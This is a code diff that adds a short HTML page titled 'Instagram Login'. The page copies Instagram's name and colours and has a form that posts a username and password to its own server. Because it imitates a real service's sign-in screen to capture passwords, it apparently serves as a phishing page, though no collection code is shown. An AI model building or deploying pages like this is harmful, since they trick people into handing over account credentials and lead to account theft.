@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        form { display: inline-block; text-align: left; }
+        input { margin: 10px 0; padding: 8px; width: 100%; }
+        button { padding: 10px 20px; background: #405DE6; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h1>Instagram</h1>
+    <form method="POST">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+</body>
+</html>
